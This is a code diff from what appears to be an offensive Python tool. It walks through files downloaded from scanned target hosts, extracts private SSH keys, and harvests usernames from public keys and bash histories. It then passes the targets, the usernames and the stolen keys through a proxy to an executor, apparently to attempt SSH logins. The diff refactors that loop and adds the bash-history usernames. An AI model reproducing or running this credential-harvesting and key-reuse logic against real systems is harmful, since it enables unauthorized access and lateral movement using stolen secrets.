@@ -104,7 +104,7 @@ def get_contents_from_pub_keys(public_keys: list):
         all_usernames.update(get_username_from_file_contents(file_lines))
     return all_usernames
 
-def get_content_from_bash_history(bash_file_files: list):
+def get_content_from_bash_histories(bash_file_files: list):
     all_usernames = set()
     for file in bash_file_files:
         with open(file, "r") as fp:
@@ -117,23 +117,26 @@ def get_all_targets(proxy_host_port: str):
         print("[-] No downloads directory found. Run a scan with -e first to download files.")
         return
     for target in os.listdir("downloads"):
-        if test_ipaddress(target):
-            downloaded_files = get_directories(os.path.join("downloads", target))
-            ssh_files = get_ssh_files(downloaded_files)
-            
-            bash_hist_files = get_bash_history_files(downloaded_files)
-            if len(ssh_files) == 0 and len(bash_hist_files) == 0:
-                continue
-            # get all usernames here
-            usernames_bash_hist = []
+        if not test_ipaddress(target):
+            continue
+        downloaded_files = get_directories(os.path.join("downloads", target))
+        ssh_files = get_ssh_files(downloaded_files)
+        
+        bash_hist_files = get_bash_history_files(downloaded_files)
+        if len(ssh_files) == 0 and len(bash_hist_files) == 0:
+            continue
+        # get all usernames here
+        bash_hist_usernames = get_content_from_bash_histories(bash_hist_files)
+        print(f"bash hist usernames found: {bash_hist_usernames}")
 
-            # get a list of all the targets private keys
-            list_of_private_keys = get_private_key(ssh_files)
-            # get a list of all the targets public keys 
-            list_of_public_keys = get_public_keys(ssh_files)
-            # parse the public keys for valid usernames and get a list of valid usernames
-            usernames = get_contents_from_pub_keys(list_of_public_keys)
-            do_executor(target, usernames, list_of_private_keys, proxy_host_port)
+        # get a list of all the targets private keys
+        list_of_private_keys = get_private_key(ssh_files)
+        # get a list of all the targets public keys 
+        list_of_public_keys = get_public_keys(ssh_files)
+        # parse the public keys for valid usernames and get a list of valid usernames
+        usernames_ssh_keys = get_contents_from_pub_keys(list_of_public_keys)
+        usernames_comb = usernames_ssh_keys.union(bash_hist_usernames)
+        do_executor(target, usernames_comb, list_of_private_keys, proxy_host_port)
 
 
 def do_executor(target: str, usernames_from_pub_keys: set, priv_keys: list, proxy_host_port: str):
